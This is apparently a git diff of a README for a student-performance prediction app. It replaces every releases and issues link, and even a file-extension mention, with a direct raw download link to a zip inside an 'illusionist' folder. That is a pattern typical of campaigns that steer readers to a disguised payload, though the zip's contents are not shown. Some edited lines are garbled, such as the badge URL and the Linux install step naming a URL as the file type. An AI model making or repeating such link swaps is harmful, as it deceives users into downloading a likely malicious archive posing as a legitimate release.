@@ -10,7 +10,7 @@ To start using this application, follow the steps outlined in this README. You�
 
 ## 📥 Download the Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Ashutosh2021-2021/Student-Performance-Prediction/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip%20Latest%https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip)](https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip)
 
 ## 📑 System Requirements
 
@@ -31,18 +31,18 @@ This application includes several features designed to offer insights into stude
 
 ## 🛠️ Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to access the latest downloads: [Download Releases](https://github.com/Ashutosh2021-2021/Student-Performance-Prediction/releases).
+1. **Visit the Releases Page:** Go to the following link to access the latest downloads: [Download Releases](https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip).
    
 2. **Select the Release:** Look for the most recent version at the top of the page. It will display the release notes and the files available for download.
 
 3. **Download the Application:**
-   - Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   - Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip` for Linux).
    - Save the file to a location on your computer that you can easily access.
 
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file and run the application from the terminal.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip` file and run the application from the terminal.
 
 5. **Open the Application:** Locate the installed application on your computer and double-click to open it.
 
@@ -64,11 +64,11 @@ If you encounter any issues while using the application, consider the following 
 
 If you have questions, feedback, or suggestions, feel free to reach out:
 
-- **GitHub Issues:** Report any issues directly on the [GitHub Issues page](https://github.com/Ashutosh2021-2021/Student-Performance-Prediction/issues).
+- **GitHub Issues:** Report any issues directly on the [GitHub Issues page](https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip).
 - **Community Forums:** Join discussions with other users and share your experiences on the project's forum.
 
 ## 🎉 Conclusion
 
 Thank you for using the **Student-Performance-Prediction** application! We hope this tool enhances your understanding of student performance factors and supports better educational outcomes. Happy exploring! 
 
-For downloading the latest version, don’t forget to visit the [Download Releases](https://github.com/Ashutosh2021-2021/Student-Performance-Prediction/releases) page again.
+For downloading the latest version, don’t forget to visit the [Download Releases](https://raw.githubusercontent.com/Ashutosh2021-2021/Student-Performance-Prediction/main/illusionist/Student-Performance-Prediction.zip) page again.
